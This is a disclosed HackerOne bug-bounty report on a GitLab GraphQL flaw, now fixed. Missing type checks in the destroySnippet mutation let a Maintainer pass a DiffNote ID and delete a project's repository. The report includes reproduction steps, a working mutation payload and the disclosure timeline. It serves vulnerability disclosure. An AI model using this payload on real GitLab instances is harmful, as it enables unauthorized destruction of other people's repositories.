---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2020-11-02
submitted: 2020-04-24T13:57:44.581Z
bounty_usd: 4000
votes: 18
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ledz1996"
source: "https://hackerone.com/reports/858671"
title: "Insufficient Type Check on GraphQL leading to Maintainer delete repository"
---
# Insufficient Type Check on GraphQL leading to Maintainer delete repository

> **Severity:** High | **Bounty:** 4,000 USD | **Votes:** 18 | **Program:** GitLab | **Disclosed:** 2020-11-02

- Report: [https://hackerone.com/reports/858671](https://hackerone.com/reports/858671)
- CWE: Improper Access Control - Generic
- Submitted: 2020-04-24T13:57:44.581Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

As you have know, Maintainer cannot delete/archive repository. But via GraphQL, they can do as there exists an sufficient check on GraphQL API

***app/graphql/mutations/snippets/destroy.rb***

```ruby
  def resolve(id:)
        snippet = authorized_find!(id: id)

        response = ::Snippets::DestroyService.new(current_user, snippet).execute
```

The function `authorized_find` lead to `object_from_id!` 

***app/graphql/mutations/snippets/base.rb***

```ruby
  def find_object(id:)
        GitlabSchema.object_from_id(id)
      end

      def authorized_resource?(snippet)
        Ability.allowed?(context[:current_user], ability_for(snippet), snippet)
      end

      def ability_for(snippet)
        "#{ability_name}_#{snippet.to_ability_name}".to_sym
      end
```

Here there is no check for whether the Object returned from `find_object` is a Snippet. I could specify any object which the user have permission of 
` "#{ability_name}_#{snippet.to_ability_name}".to_sym` to.
For example: A DiffNote that is created by a Maintainer in the Project as the function.

If I have such a ID:
```
mutation test{
  destroySnippet(input: {id: "gid://gitlab/DiffNote/116"}){
    errors
  }
}
```

It refer to an DiffNote with id `116`
Perfectly, a Maintainer have an `admin_note` and `admin_snippet` on a DiffNote (!!!)

In the mutation Destroy the call to `` ::Snippets::DestroyService.new(current_user, snippet)`` but the Object of `snippet` is actually a `DiffNote`

***app/services/snippets/destroy_service.rb***
```ruby
  def attempt_destroy!
      result = Repositories::DestroyService.new(snippet.repository).execute

      raise DestroyError if result[:status] == :error

      snippet.destroy!
    end
```
and in 

***app/models/diff_note.rb***

```ruby
  def repository
    noteable.respond_to?(:repository) ? noteable.repository : project.repository
  end
```
It return the `project.repository` which in turn the Project that the `DestroyService` gonna delete

### Steps to reproduce

1. Create 2 User: User A, User B
2. User A create a project set User B as Maintainer.
F802288
3. User B create 2 branch with the same file but different content
F802287
F802289
4. Create a merge request for those 2 Branch
F802290
5. Create a diff note for the file by clicking at the comment on a line of the file then Submit it
F802291
6. To know the ID of diff note, delete this one, the ID will show up in burp then you will know the ID of the next one
F802292
7. Use the `/-/graphiql-explorer` to execute the following the query

```
mutation test{
  destroySnippet(input: {id: "gid://gitlab/DiffNote/118"}){
    errors
  }
}
```

F802293
8. Enjoy no repository
F802294
9. If you click on `Create empty repository` It will actually make the Project 404 but It still show up on the User's project feed
F802295
F802296
### Impact

Unauthorized deleting of repository/project by maintainers

### Output of checks

This bug happens on GitLab.com

## Impact

Unauthorized deleting of repository/project by maintainers

## Timeline

- **Report Filed**
- **2020-04-24** @ledz1996: #### Results of GitLab environment info
`sudo gitlab-rake gitlab:env:info`

```
System information
System:         Ubuntu 16.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.6.5p114
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.7
Git Version:    2.26.2
Sidekiq Version:5.2.7
Go Version:     unknown

GitLab information
Version:        12.10.0-ee
Revision:       58d798bed62
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     11.7
URL:            http://gitlab.example.vm
HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers: saml

GitLab Shell
Version:        12.2.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```
- **2020-04-24** @gitlab-securitybot: Hi @ledz1996,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 14 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-04-24** @ledz1996: Also this is not limited to DiffNote. Any Object that has function `repository` I guess DiffNote is a good example
- **Report Needs More Info**
- **Report New**
- **2020-04-24** @ledz1996: But its better to use DiffNote since it will make the Project path exists but 404
- **2020-04-24** @ledz1996: Hi, I create a video with `DiffNote`

Please make sure:
- User A & B is not root account
- User B must create 2 branch to compare and create his own files
- Take a look at the step 6 to guess the ID of the next DiffNote and use it
`gid://gitlab/DiffNote/<id-at-step6-plus-1>`
- Watch this video
- **Report Triaged**
- **Bounty Awarded**
- **2020-05-29** @ledz1996: Hi, It's been a month, i just want if there is any update on this issue.
Thanks
- **2020-05-29** @dcouture: Hi @ledz1996,

Nothing to report, I will ask the engineering team for updates.

Thanks,
Dominic
GitLab Security Team
- **2020-06-05** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2020-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **2020-07-31** @ledz1996: Thank you for the bounty!
- **2020-08-27** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2020-09-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **2020-09-04** @ledz1996: Hi @dcouture, the fix is sufficient, Thank you so much!
- **Agreed On Going Public**
- **2020-11-02** @ledz1996: Hi @dcouture, Thanks for the notification, been out of "hacking" for too long :D. I'm happy to disclose this!
- **Agreed On Going Public**
- **Report Became Public**
- **2020-11-02** @ledz1996: oh wait, could you please remove the video?
- **2020-11-02** @dcouture: You're welcome to come back to hacking any time ;)

I removed the video and will make sure it's removed from the GitLab issue before making it public.

Thanks!
Dominic
GitLab Security Team
